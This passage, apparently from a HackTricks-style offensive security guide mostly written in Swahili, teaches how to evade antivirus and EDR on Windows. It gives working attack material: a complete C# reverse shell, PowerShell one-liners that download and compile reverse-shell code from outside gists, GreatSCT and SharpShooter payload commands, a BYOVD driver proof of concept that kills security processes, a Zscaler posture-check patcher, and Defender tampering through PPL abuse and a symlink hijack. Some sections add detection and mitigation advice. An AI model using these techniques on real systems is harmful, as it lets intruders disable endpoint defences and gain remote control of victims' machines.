-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni mekanismo yenye nguvu ya logging katika Windows inayoruhusu programu na vipengele vya mfumo **kurekodi matukio**. Hata hivyo, pia inaweza kutumika na bidhaa za usalama kufuatilia na kutambua shughuli zilizo hatarishi.

Vilevile jinsi AMSI inavyoweza kuzimwa (kudunduliwa), inawezekana kufanya kazi ya **`EtwEventWrite`** ya mchakato wa user space irudi mara moja bila kurekodi matukio yoyote. Hii hufanyika kwa kupachika (patching) kazi hiyo kwenye memory ili irudi mara moja, kwa ufanisi kuzima ETW logging kwa mchakato huo.

Unaweza kupata taarifa zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Kupakia binaries za C# kwenye memory imejulikana kwa muda na bado ni njia nzuri sana ya kuendesha zana zako za post-exploitation bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutalazimika tu kujali kuhusu kupachika AMSI kwa mchakato mzima.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) tayari hutoa uwezo wa kuendesha C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inahusisha **kuanzisha mchakato mpya wa kafara**, kuingiza post-exploitation malicious code yako ndani ya mchakato huo mpya, kuendesha code yako mabaya na baada ya kumaliza, kuua mchakato mpya. Hii ina faida na hasara zake. Faida ya njia ya fork and run ni kwamba utekelezaji hutokea **nj exterior** ya mchakato wetu wa Beacon implant. Hii inamaanisha kwamba ikiwa kitu kwenye hatua yetu ya post-exploitation kitashindwa au kukamatwa, kuna **mwana nafasi mkubwa** wa **implant yetu kuishi.** Hasara ni kwamba una **nafasi kubwa** ya kukamatwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Inahusu kuingiza post-exploitation malicious code **ndani ya mchakato wake mwenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kukiwekwa chini ya skani ya AV, lakini hasara ni kwamba ikiwa kitu kitakwenda vibaya katika utekelezaji wa payload yako, kuna **mwana nafasi mkubwa** ya **kupoteza beacon yako** kwa sababu inaweza crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa unataka kusoma zaidi kuhusu C# Assembly loading, tafadhali angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kuendesha malicious code kwa kutumia lugha zingine kwa kutoa mashine iliyodukuliwa ufikiaji **kwa interpreter environment iliyosakinishwa kwenye Attacker Controlled SMB share**.

Kwa kuruhusu ufikiaji wa Interpreter Binaries na mazingira kwenye SMB share unaweza **kuendesha code yoyote katika lugha hizi ndani ya memory** ya mashine iliyodukuliwa.

Repo inabainisha: Defender bado anaskana scripts lakini kwa kutumia Go, Java, PHP n.k. tunapata **urahisi zaidi wa kupitisha static signatures**. Upimaji na random un-obfuscated reverse shell scripts katika lugha hizi umeonyesha mafanikio.

## TokenStomping

Token stomping ni technique inayomruhusu mshambuliaji **kubadilisha access token au bidhaa ya usalama kama EDR au AV**, kuwafanya kupunguza ruhusa ili mchakato usifai kuaga lakini ukose ruhusa za kuangalia shughuli zilizo hatarishi.

Ili kuzuia hili Windows inaweza **kuzuia mchakato za nje** kupata handles juu ya tokens za mchakato za usalama.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu kupeleka Chrome Remote Desktop kwenye PC ya mwathiri kisha kuitumia kuichukua na kudumisha persistence:
1. Download kutoka https://remotedesktop.google.com/, bonyeza "Set up via SSH", kisha bonyeza faili la MSI kwa Windows ili kupakua MSI file.
2. Endesha installer kwa kimya kwenye mwathiri (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na bonyeza next. Wizard kisha itakuuliza kutoa idhini; bonyeza Authorize button kuendelea.
4. Endesha parameter iliyotolewa kwa marekebisho baadhi: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Kumbuka param ya pin ambayo inaruhusu kuweka pin bila kutumia GUI).

## Advanced Evasion

Evasion ni mada ngumu sana, wakati mwingine unapaswa kuzingatia vyanzo vingi tofauti vya telemetry ndani ya mfumo mmoja, hivyo ni karibu haiwezekani kubaki bila kugunduliwa kabisa katika mazingira yaliyokomaa.

Kila mazingira unayoshambulia itakuwa na nguvu na udhaifu wake wenyewe.

Nakulihimiza sana uangalie hotuba hii kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), kupata mtazamo zaidi juu ya Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hii pia ni hotuba nzuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo itafanya **kuondoa sehemu za binary** hadi itakapo **gundua ni sehemu gani Defender** inaona kama hatarishi na ikigawa kwako.\
Zana nyingine inayofanya kitu kimoja ni [**avred**](https://github.com/dobin/avred) yenye huduma ya wavuti kwa wazi katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, kila Windows ilikuja na **Telnet server** ambayo unaweza kuiweka (kama administrator) kwa kufanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fanya **ianze** wakati mfumo unapoanza na **endesha** sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha telnet port** (stealth) na zima firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka bin downloads, sio setup)

**ON THE HOST**: Endesha _**winvnc.exe**_ na sanidi server:

- Washa chaguo _Disable TrayIcon_
- Weka nenosiri katika _VNC Password_
- Weka nenosiri katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili **iliyoundwa hivi karibuni** _**UltraVNC.ini**_ ndani ya **victim**

#### **Reverse connection**

The **attacker** anapaswa kutekeleza ndani ya host yake binary `vncviewer.exe -listen 5900` ili itakuwa tayari kumpokea reverse **VNC connection**. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kudumisha stealth lazima usifanye mambo kadhaa

- Usianzisha `winvnc` ikiwa tayari inakimbia au utaanzisha [popup](https://i.imgur.com/1SROTTl.png). Angalia ikiwa inaendesha kwa `tasklist | findstr winvnc`
- Usianzisha `winvnc` bila `UltraVNC.ini` katika directory ile ile au itasababisha [the config window](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usitumie `winvnc -h` kwa msaada au utaanzisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa anzisha lister kwa `msfconsole -r file.rc` na utekeleze **xml payload** kwa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Defender wa sasa ataua mchakato haraka sana.**

### Kujenga reverse shell yetu mwenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Kwanza C# Revershell

I-compile kwa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# kwa kutumia compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Kupakua na utekelezaji moja kwa moja:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya obfuscators ya C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia Python kwa mfano wa kujenga injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 ilitumia programu ndogo ya console inayojulikana kama **Antivirus Terminator** ili kuzima ulinzi wa endpoint kabla ya kuangusha ransomware. Chombo hicho kinaleta **driver yake mwenye udhaifu lakini *imesainiwa*** na kulitumia vibaya kutoa operesheni zenye ruhusa katika kernel ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzizuia.

Mambo muhimu
1. **Signed driver**: Faili lililotumwa kwenye diski ni `ServiceMouse.sys`, lakini binary ni driver iliyo saini kwa uhalali `AToolsKrnl64.sys` kutoka Antiy Labs’ “System In-Depth Analysis Toolkit”. Kwa sababu driver ina saini halali ya Microsoft, inawekwa hata wakati Driver-Signature-Enforcement (DSE) imewashwa.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza unaandikisha driver kama **huduma ya kernel** na wa pili unaoanisha ili `\\.\ServiceMouse` iweze kupatikana kutoka user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Uwezo                                  |
|-----------:|-----------------------------------------|
| `0x99000050` | Kumaliza mchakato wowote kwa PID (ilitumika kuua huduma za Defender/EDR) |
| `0x990000D0` | Futa faili lolote kwenye diski |
| `0x990001D0` | Ondoa driver na uondoe huduma |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD inaruka kabisa ulinzi wa user-mode; code inayotekelezwa kwenye kernel inaweza kufungua michakato *iliyolindwa*, kuimaliza, au kuhujumu vitu vya kernel bila kujali PPL/PP, ELAM au vipengele vingine vya kuimarisha.

Ugundaji / Uzuiaji
• Washa orodha ya kuzuia madriver yenye udhaifu ya Microsoft (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.  
• Fuatilia uundaji wa huduma mpya za *kernel* na toa tahadhari wakati driver inapopakuliwa kutoka kwenye directory inayoweza kuandikwa na kila mtu au haipo kwenye orodha ya kuruhusiwa.  
• Angalia kushikilia handles za user-mode kwa vitu vya kifaa maalum zikifuatiwa na simu zinazoshukiwa za `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** inatekeleza sheria za hali ya kifaa kwa upande wa mteja na inategemea Windows RPC kuwasilisha matokeo kwa vipengele vingine. Chaguzi mbili dhaifu za muundo zinafanya kupitishwa kikamilifu kuwawezekane:

1. Uchambuzi wa posture hufanyika **kikamilifu upande wa mteja** (boolean hutumwa kwa server).  
2. Endpoints za ndani za RPC zinathibitisha tu kwamba executable inayounganisha **imesainiwa na Zscaler** (kupitia `WinVerifyTrust`).

Kwa **kufanyia patch binary nne zilizosainiwa kwenye diski** mbinu zote mbili zinaweza kuzimalishwa:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Inarudisha `1` kila wakati, hivyo kila ukaguzi unachukuliwa kuwa unaofuata |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Imefupishwa (short-circuited) |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **Yote** posture checks zinaonyesha **green/compliant**.
* Binary zisizokuwa na saini au zilizorekebishwa zinaweza kufungua named-pipe RPC endpoints (mfano `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyoharibiwa inapata ufikiaji usiozuiliwa wa mtandao wa ndani ulioainishwa na sera za Zscaler.

Mfano huu wa kesi unaonyesha jinsi maamuzi ya kuamini upande wa mteja peke yake na ukaguzi rahisi wa saini yanaweza kushindwa kwa mabadiliko machache ya byte.

## Matumizi mabaya ya Protected Process Light (PPL) ili Kubadilisha AV/EDR kwa LOLBINs

Protected Process Light (PPL) inatekeleza hierarki ya signer/level ili tu michakato iliyo na ulinzi sawa-au-juu iweze kubadilisha kwa nguvu mchakato mwingine. Kivamizi, ikiwa unaweza kuendesha kwa njia halali binary iliyo na PPL na kudhibiti arguments zake, unaweza kubadilisha kazi isiyo hatari (mfano, logging) kuwa primitive ya kuandika iliyo na vizuizi na iliyoungwa mkono na PPL dhidi ya directories zilizo na ulinzi zinazotumiwa na AV/EDR.

Nini hufanya mchakato uendeshwe kama PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Msaidizi wa chanzo huria: CreateProcessAsPPL (inachagua protection level na hupitisha arguments kwa EXE lengwa):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Mfano wa matumizi:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Binary ya mfumo iliyosainiwa `C:\Windows\System32\ClipUp.exe` inazindua yenyewe na inakubali parameter ili kuandika faili ya log kwenye njia iliyotajwa na mtumaji.
- Inapoanzishwa kama mchakato wa PPL, uandishi wa faili unafanyika ukiungwa mkono na PPL.
- ClipUp haiwezi kuchambua njia zenye nafasi; tumia njia fupi za 8.3 ili kuelekeza kwenye maeneo ambayo kawaida yanalindwa.

8.3 short path helpers
- Orodhesha majina mafupi: `dir /x` katika kila saraka ya mzazi.
- Pata njia fupi katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Mnyororo wa matumizi mabaya (muhtasari)
1) Zindua LOLBIN inayoweza PPL (ClipUp) kwa kutumia `CREATE_PROTECTED_PROCESS` kwa launcher (mfano, CreateProcessAsPPL).
2) Pasa hoja ya njia ya log ya ClipUp ili kulazimisha uundaji wa faili katika saraka ya AV iliyo na ulinzi (mfano, Defender Platform). Tumia majina mafupi ya 8.3 kama inahitajika.
3) Ikiwa binary lengwa kwa kawaida imefunguliwa/imefungwa na AV wakati inafanya kazi (mfano, MsMpEng.exe), panga uandishi wakati wa boot kabla AV haijaanza kwa kufunga huduma ya auto-start ambayo inaendesha mapema kwa uaminifu. Thibitisha mfuatano wa boot kwa Process Monitor (boot logging).
4) Baada ya reboot uandishi unaoungwa mkono na PPL hufanyika kabla AV kufunga binaries zake, ukiharibu faili lengwa na kuzuia kuanzishwa.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Huwezi kudhibiti yaliyomo ambayo ClipUp inaandika zaidi ya mahali; mbinu hii inafaa zaidi kwa uharibifu badala ya kuingiza maudhui kwa usahihi.
- Inahitaji local admin/SYSTEM ili kusakinisha/kuanzisha service na fursa ya reboot.
- Muda ni muhimu: lengo halipaswi kuwa wazi; utekelezaji wakati wa boot huepuka file locks.

Detections
- Uundaji wa mchakato wa `ClipUp.exe` una hoja zisizo za kawaida, hasa ikiwa umezaliwa na launchers zisizo za kawaida, karibu na boot.
- Services mpya zilizowekwa ku-auto-start binaries za shaka na kuanza mara kwa mara kabla ya Defender/AV. Chunguza uundaji/ubadilishaji wa service kabla ya kushindwa kuanza kwa Defender.
- Ufuatiliaji wa uadilifu wa faili kwenye Defender binaries/Platform directories; uundaji/ubadilishaji wa faili usiotarajiwa na michakato yenye protected-process flags.
- ETW/EDR telemetry: tafuta michakato iliyoundwa kwa `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya viwango vya PPL na binaries zisizo za AV.

Mitigations
- WDAC/Code Integrity: zuia ni binaries zipi zilizotiwa sahihi zinaweza kuendesha kama PPL na chini ya wazazi gani; zuia kuitwa kwa ClipUp nje ya muktadha halali.
- Service hygiene: zuia uundaji/ubadilishaji wa services za auto-start na fuatilia udanganyifu wa start-order.
- Hakikisha Defender tamper protection na early-launch protections zimeshawashwa; chunguza makosa ya startup yanayoashiria uharibifu wa binary.
- Fikiria kuzima 8.3 short-name generation kwenye volumes zinazohudumia security tooling ikiwa inafaa kwa mazingira yako (jaribu kikamilifu).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender huchagua platform kutoka anayoendesha kwa kuorodhesha subfolders chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Inachagua subfolder yenye lexicographically highest version string (mfano, `4.18.25070.5-0`), kisha inaanzisha mchakato wa service za Defender kutoka hapo (ikisasisha service/registry paths ipasavyo). Uteuzi huu unaamini directory entries ikiwa ni pamoja na directory reparse points (symlinks). Administrator anaweza kutumia hili kuielekeza Defender kwenye path inayoweza kuandikwa na mshambuliaji na kufanikisha DLL sideloading au kuharibika kwa service.

Preconditions
- Local Administrator (inahitajika kuunda directories/symlinks chini ya Platform folder)
- Uwezo wa kufanya reboot au kusababisha Defender platform re-selection (service restart on boot)
- Only built-in tools required (mklink)

Why it works
- Defender inalizuia maandishi katika folda zake mwenyewe, lakini uteuzi wa platform inaamini entry za directory na huchagua toleo la juu ki-lexicographic bila kuthibitisha kuwa lengo linaelekezwa kwa path iliyolindwa/imuaminifu.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Tengeneza symlink ya directory yenye toleo la juu ndani ya Platform ikielekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uteuzi wa trigger (reboot inapendekezwa):
```cmd
shutdown /r /t 0
```
4) Thibitisha MsMpEng.exe (WinDefend) inaendesha kutoka kwenye njia iliyohamishwa:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuona njia mpya ya mchakato chini ya `C:\TMP\AV\` na service configuration/registry ikionyesha eneo hilo.

Post-exploitation options
- DLL sideloading/code execution: Angusha/ibadilishe DLLs ambazo Defender huzipakia kutoka kwenye application directory yake ili kutekeleza code katika processes za Defender. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili katika kuanzishwa kwa mara inayofuata configured path haitatambulika na Defender itashindwa kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Kumbuka kwamba mbinu hii haitoi kuinua ruhusa yenyewe; inahitaji admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams zinaweza kuhamisha runtime evasion kutoka ndani ya C2 implant na kuiweka ndani ya module lengwa yenyewe kwa ku-hook Import Address Table (IAT) yake na kupitisha APIs zilizochaguliwa kupitia attacker-controlled, position‑independent code (PIC). Hii inapanua evasion zaidi ya uso mdogo wa API ambao kits nyingi zinaonyesha (mfano, CreateProcessA), na inatoa ulinzi ule ule kwa BOFs na post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
